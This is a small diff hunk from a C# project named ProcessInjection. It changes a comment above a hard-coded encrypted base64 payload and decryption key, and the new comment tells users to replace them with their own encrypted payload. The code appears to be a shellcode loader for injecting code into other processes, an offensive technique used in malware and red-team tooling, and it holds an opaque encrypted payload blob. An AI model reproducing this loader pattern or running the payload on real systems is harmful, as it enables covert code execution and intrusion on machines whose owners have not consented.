@@ -45,7 +45,7 @@ namespace ProcessInjection
                 return;
             }
 
-            // decrypt the base64 payload
+            // decrypt the base64 payload - change these to your own encrypted payload and key
             string payload = "sZkMiiTitR5hQL2YXTBgjq91qq0FuEqgfR7YiKt2N1IZ8vqW3q/BrIYTjBb7nKLXCsJM25sRqh+R9WHGNsTV8webqwx7ZfAYSvlmEmzIJcKaBVdJO+Lbr7h9RomrOdyaPUAZ6P49lnsZFF1fdvnFOg/WvSdKUrx/eKEt5sNBn/Jz43y26mDEwEEqseydPQHyBcT9Av/ZkTQC6GZU8D+pQhKvXNdnlGrHJk4+G25me/Hzr0P1YuX9ZpGbyXb/pLdmdViAGAPtA/OORVt6xmij4AY24j8SLocUs2A6lSJZHYD2C1+DIc1Lyw8UJ6dtNIU2xDtsHCWX0OlkcjU+QoYpCavs78Y+OePjyBwkryWTzMyuKBgAREjbQQdsIn6dQZeqk/tKI/l6Fmhu27V+wFX7mxUP/KXWf9PI/3QYiuLmkJCWFBL9sINPbLVLePFSke8Ik3t+vp5SIcM+wMufg+TXBdUNpE//gTgCpblXdJfkkqVpMFBxnfX2vYPDcFLWteiNsnHCn9REbVB3MqJe5T55tO/CLq1KkZ2R7Z7rra6H8OhJgOLKEdJ/XHdZV9IFatAtRW2dxVo49P2YFmux2WSDiKhVRoCuLMVM6PeTuzsN+2qV4Zrq6tRAVLwmmTn5uflWER1aScePh6+6utXW/0jS+Hz7KiGP2//8+YDwzYbkLJnfn9B4AdmE4BuNTJRrv7tumsxboNkmWOx87lVElzn5ZM9OP721s8LiSyfkD1zm4o9j2u80syPeEU3PXvOU1epBTsTjdwRWlAYF+wzv3olAjPzR/xojjB602MIUNeCPn4fqDp6NjEokELcgawbWNl1vKYo4QEYgtlhVmqIkk2ooz527AEQb5EWQhkaZEWr4AAmGO1YfvYDCTcfUwV9p/jkg";
             string key = "fjlmjiEgnQ4K6CjNCrPlqug1HW4icMec";
 
